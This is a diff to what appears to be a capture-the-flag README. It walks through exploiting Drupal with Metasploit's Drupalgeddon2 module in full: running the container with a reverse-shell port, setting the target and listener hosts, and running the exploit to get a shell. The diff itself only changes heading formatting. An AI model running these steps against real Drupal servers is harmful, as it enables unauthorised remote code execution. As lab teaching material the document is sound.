@@ -27,36 +27,36 @@ Once nmap is installed you can scan the target host with `nmap <target_host> -Pn
 ##### Metasploit
 If you have Docker installed you can simply run the metasploit container image. Here's how to do it:
 
-###### Pull metasploit docker image from DockerHub
+Pull metasploit docker image from DockerHub
 
 `docker pull metasploitframework/metasploit-framework`
 
-###### Run metasploit container, forward port 4444 (needed for reverse shell), make sure those ports are open in security groups etc in your metasploit machine
+Run metasploit container, forward port 4444 (needed for reverse shell), make sure those ports are open in security groups etc in your metasploit machine
 
 `docker run -it -p 4444-4450:4444-4450 metasploitframework/metasploit-framework`
 
-###### Search for the exploit you'd like to use based on nmap results, in this challenge look for Drupal exploits
+Search for the exploit you'd like to use based on nmap results, in this challenge look for Drupal exploits
 
 `search drupal`
 
-###### Select the Drupalgeddon2 exploit from the list
+Select the Drupalgeddon2 exploit from the list
 
 `use exploit/unix/webapp/drupal_drupalgeddon2`
 
-###### Set the host and port for the attacker's and victim's machine
+Set the host and port for the attacker's and victim's machine
 
 `set RHOSTS <host>`
 `set RPORT <port>`
 `set LHOST <remote ip of metasploit machine>`
 `set LPORT 4444`
 
-###### Run the exploit!
+Run the exploit!
 
 `run`
 
-###### This may fail in some cases, if it fails once reset the LHOST and run again
+This may fail in some cases, if it fails once reset the LHOST and run again
 
 `set LHOST <remote ip of metasploit machine>`
 `run`
 
-###### You should be able to get shell at this point and run commands in the container. Can you get the flag?
+You should be able to get shell at this point and run commands in the container. Can you get the flag? Good luck!
